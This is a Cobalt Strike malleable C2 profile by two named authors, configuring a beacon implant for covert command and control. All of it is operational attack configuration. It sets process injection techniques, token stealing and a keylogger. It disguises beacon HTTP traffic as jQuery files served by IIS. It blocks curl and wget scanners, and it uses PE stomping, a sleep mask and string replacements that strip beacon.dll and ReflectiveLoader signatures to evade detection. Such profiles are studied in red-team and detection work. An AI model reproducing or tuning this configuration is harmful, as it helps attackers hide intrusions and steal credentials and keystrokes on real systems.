#Author: Kleiton Kurti (@kleiton0x7e) & John Stigerwalt (@jstigerwalt1)

### Auxiliary Settings ###
set sample_name "Stigs Random C2 Profile";
set host_stage "false";  # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.
set useragent "<RAND>"; # "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"; Use random Internet Explorer UA by default
set create_remote_thread "true"; # Allow beacon to create threads in other processes
set hijack_remote_thread "true"; # Allow beacon to run jobs by hijacking the primary thread of a suspeneded process

### Beacon Sleep Settings ###
set sleeptime "3000";
set jitter "33";        #       Default jitter factor (0-99%)

### SMB Options ###
set pipename "Winsock2\\CatalogChangeListener-###-0";
set pipename_stager "TSVCPIPE-########-####-4###-####-############";

### SSH BANNER ###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

### Steal Token ###
set steal_token_access_mask "11";

### Proxy Options ###
set tasks_max_size "1604500";
#set tasks_proxy_max_size "921600";
#set tasks_dns_proxy_max_size "71680";


### Main HTTP Config Settings ###
http-config {
  set headers "Date, Server, Content-Length, Keep-Alive, Contentnection, Content-Type";
  header "Server" "Apache";
  header "Keep-Alive" "timeout=10, max=100";
  header "Connection" "Keep-Alive";
  set trust_x_forwarded_for "true";
  set block_useragents "curl*,lynx*,wget*";
}


### HTTPS Cert Settings ###

https-certificate {
# Self Signed Certificate Options
#       set CN       "*.azureedge.net";
#       set O        "Microsoft Corporation";
#       set C        "US";
#       set L        "Redmond";
#       set ST       "WA";
#       set OU       "Organizational Unit";
#       set validity "365";

# Imported Certificate Options
#        set keystore "domain.store";
#        set password "password";
}

# code-signer {
#       set keystore "keystore.jks";
#       set password "password";
#       set alias "server";
#       set digest_algorithm "SHA256";
#       set timestamp "false";
#       set timestamp_url "http://timestamp.digicert.com";
#}

### Post Exploitation Settings ###
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "false";
    set keylogger "GetAsyncKeyState";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
}

### Process Injection ###
process-inject {
  set allocator "NtMapViewOfSection"; # or VirtualAllocEx
  set bof_allocator "VirtualAlloc";
  set bof_reuse_memory "true";
  set min_alloc "24576";
  set startrwx "false";
  set userwx "false";

  transform-x86 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
    }
  transform-x64 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
    }

  execute {
      CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
      NtQueueApcThread-s;
      CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
      CreateRemoteThread;
      RtlCreateUserThread;
      SetThreadContext;
  }
}


http-get {
        set verb "GET"; # GET / POST
        set uri "/css3/index2.shtml";  # Can be space separated string. Each beacon will be assigned one of these when the stage is built

        client {
                header "Accept" "text/html, application/xhtml+xml, image/jxr, */*";
                header "Accept-Encoding" "gzip, deflate";
                header "Accept-Language" "en-US; q=0.7, en; q=0.3";
                header "Connection" "keep-alive";
                header "DNT" "1";

                metadata {
                        base64url;
                        parameter "accept";
                }
        }

        server {
                header "Content-Type" "application/yin+xml";
                header "Server" "IBM_HTTP_Server/6.0.2.19 Apache/2.0.47 (Unix) DAV/2";

                output{
                        base64;
                        print;
                }
        }
}

http-post {
        set verb "POST"; # GET / POST
        set uri "/tools/family.html";
        client {
                header "Accept" "text/html, application/xhtml+xml, */*";
                header "Accept-Encoding" "gzip, deflate";
                header "DNT" "1";
                header "Content-Type" "application/x-www-form-urlencoded";

                id {
                        base64;
                        prepend "token=";
                        header "Cookie";
                }

                output{
                        base64url;
                        prepend "input=";
                        print;
                }
        }

        server {
                header "Content-Type" "text/vnd.fly";
                header "Server" "IBM_HTTP_Server/6.0.2.19 Apache/2.0.47 (Unix) DAV/2";

                output {
                        base64;
                        print;
                }
        }
}


### Start of Real HTTP GET and POST settings ###

http-get "msrpc-azure" { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server

    set uri "/compare/v1.44/VXK7P0GBE8"; # URI used for GET requests
    set verb "GET";

    client {

        header "Accept" "image/*, application/json, text/html";
        header "Accept-Language" "nb";
        header "Accept-Encoding" "br, compress";
	header "Access-X-Control" "True";

        metadata {
            mask; # Transform type
            base64url; # Transform type
            prepend "SESSIONID_XVQD0C55VSGX3JM="; # Cookie value
            header "Cookie";                                  # Cookie header
        }
    }

    server {

        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            mask; # Transform type
            base64url; # Transform type
            prepend "/*! jQuery v2.2.4 | (c) jQuery Foundation | jquery.org/license */    !function(a,b){'object'==typeof module&&'object'==typeof module.exp    orts?module.exports=a.document?b(a,!0):function(a){if(!a.document)th    row new Error('jQuery requires a window with a document');return b(a    )}:b(a)}('undefined'!=typeof window?window:this,function(a,b){var c=    [],d=a.document,e=c.slice,f=c.concat,g=c.push,h=c.indexOf,i={},j=i.t    oString,k=i.hasOwnProperty,l={},m='2.2.4',n=function(a,b){return new     n.fn.init(a,b)},o=/^[suFEFFxA0]+|[suFEFFxA0]+$/g,p=/^-ms-/,q=/-    ([da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype    ={jquery:m,constructor:n,selector:'',length:0,toArray:function(){retu    rn e.call(this)},get:function(a){return null!=a?0>a?this[a+this.lengt    h]:this[a]:e.call(this)},pushStack:function(a){var b=n.merge(this.con    structor(),a);return b.prevObject=this,b.context=this.context,b},each:";
            append "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
            print;
        }

    }
}

http-post "msrpc-azure" { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server

    set uri "/Construct/v1.85/JDX894ZM2WF1"; # URI used for POST block.
    set verb "POST"; # HTTP verb used in POST block. Can be GET or POST

    client {

        header "Accept" "application/xml, application/xhtml+xml, application/json";
        header "Accept-Language" "tn";
        header "Accept-Encoding" "identity, *";
	header "Access-X-Control" "True";

        id {
            mask; # Transform type
            netbiosu; # Transform type
            parameter "_KZZUEUVN";
        }

        output {
            mask; # Transform type
            netbios; # Transform type
            print;
        }
    }

    server {

        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            mask; # Transform type
            netbiosu; # Transform type
            prepend "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";
            append "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";
            print;

        }
    }
}

stage {
    set checksum        "0";
    set compile_time    "5 May 2023 10:52:15";
    set entry_point     "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    set name	        "srv.dll";
    set magic_mz_x64    "OOPS";
    set magic_mz_x86    "OOPS";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header    "\x92\x75\xde\x7f\xf0\x62\x4c\xf0\xc3\x44\x74\\x90\x97\x05\xa2\x3d\xd2\x18\xab\x08\xaa\xe9\xcf\x98\x81";

    set sleep_mask "true";

    set smartinject "true";

    #set allocator "HeapAlloc";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x48\x0f\x1f\x00\x66\x90\x43\x66\x87\xdb\x66\x87\xd2\x40\x45\x49\x41\x90\x87\xd2\x47\x87\xdb\x4c\x0f\x1f\x00\x0f\x1f\x00\x66\x87\xc9\x0f\x1f\x04\x00\x42\x66\x0f\x1f\x04\x00\x90\x87\xc9\x44\x46\x40";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        strrep "beacon.dll" ""; # Remove this text
        strrep "msvcrt.dll" "";
        strrep "C:\\Windows\\System32\\msvcrt.dll" "";
        }

    transform-x64 {
        prepend "\x48\x0f\x1f\x00\x66\x90\x43\x66\x87\xdb\x66\x87\xd2\x40\x45\x49\x41\x87\x90\xd2\x47\x87\xdb\x4c\x0f\x1f\x00\x0f\x1f\x00\x66\x87\xc9\x0f\x1f\x04\x00\x42\x66\x0f\x1f\x04\x00\x90\x87\xc9\x44\x46\x40";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        strrep "beacon.dll" ""; # Remove this text
        strrep "msvcrt.dll" "";
        strrep "C:\\Windows\\System32\\msvcrt.dll" "";
        strrep "Stack around the variable" "";
        strrep "was corrupted." "";
        strrep "The variable" "";
        strrep "is being used without being initialized." "";
        strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
        strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
        strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
        strrep "Stack memory was corrupted" "";
        strrep "A local variable was used before it was initialized" "";
        strrep "Stack memory around _alloca was corrupted" "";
        strrep "Unknown Runtime Check Error" "";
        strrep "Unknown Filename" "";
        strrep "Unknown Module Name" "";
        strrep "Run-Time Check Failure" "";
        strrep "Stack corrupted near unknown variable" "";
        strrep "Stack pointer corruption" "";
        strrep "Cast to smaller type causing loss of data" "";
        strrep "Stack memory corruption" "";
        strrep "Local variable used before initialization" "";
        strrep "Stack around" "corrupted";
        strrep "operator" "";
        strrep "operator co_await" "";
        strrep "operator<=>" "";
    }
}
